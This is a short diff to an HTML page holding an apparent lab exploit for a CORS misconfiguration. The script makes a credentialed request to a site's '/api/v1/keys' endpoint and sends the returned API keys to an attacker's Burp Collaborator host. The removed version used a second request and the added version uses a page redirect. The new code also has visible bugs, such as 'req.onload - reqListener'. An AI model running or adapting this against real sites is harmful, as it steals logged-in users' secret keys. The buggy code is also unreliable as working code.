@@ -3,15 +3,15 @@
 	<body>
 		<script>
 			var req = new XMLHttpRequest();
-			req.open("POST", "http://ptl-fbafd824-4fabf863.libcurl.so/api/v1/keys", false);
+			req.onload - reqListener;
+			req.open("POST", "http://ptl-fbafd824-4fabf863.libcurl.so/api/v1/keys", true);
 			req.withCredentials = true;
 			req.send();
 			var results = req.responseText;
 			
-			var req2 = new XMLHttpRequest();
-			req2.open("GET", "https://dl2oyk3ubbdfbz10f67wa6aed5jv7k.burpcollaborator.net/?key=" + results, false);
-			req2.withCredentials = true;
-			req2.send();	  
+			function reqListener() {
+				location = "https://dl2oyk3ubbdfbz10f67wa6aed5jv7k.burpcollaborator.net/?key=" + results;	
+			}
 		</script>
 	</body>
 </html>
